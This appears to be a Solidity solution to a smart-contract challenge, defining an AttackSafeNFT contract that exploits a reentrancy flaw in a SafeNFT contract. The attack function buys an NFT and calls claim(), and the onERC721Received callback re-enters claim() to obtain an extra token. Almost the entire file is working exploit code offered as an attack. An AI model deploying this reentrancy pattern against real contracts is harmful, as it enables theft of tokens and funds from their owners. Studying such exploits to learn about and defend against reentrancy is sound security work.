// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;


contract SafeNFT {
    function buyNFT() external payable {}
    function claim() external {}
    function transferFrom(address from, address to, uint256 id) external {}
}

interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be
     * reverted.
     *
     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract AttackSafeNFT {

    SafeNFT safeNFT;
    uint256 hackCount;
    address owner;

    constructor(address _safeNFT) {
        safeNFT = SafeNFT(_safeNFT);
        owner = msg.sender;
    }

    // function withdrawNFT() public {
    //     safeNFT.transferFrom(address(this), owner, )
    // }

    function attack() public payable {
        safeNFT.buyNFT{value: msg.value}();
        safeNFT.claim();
    }

    function onERC721Received(address to, address zero, uint256 id, bytes memory data) external returns(bytes4) {
        if(hackCount < 1) {
            hackCount++;
            safeNFT.claim();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}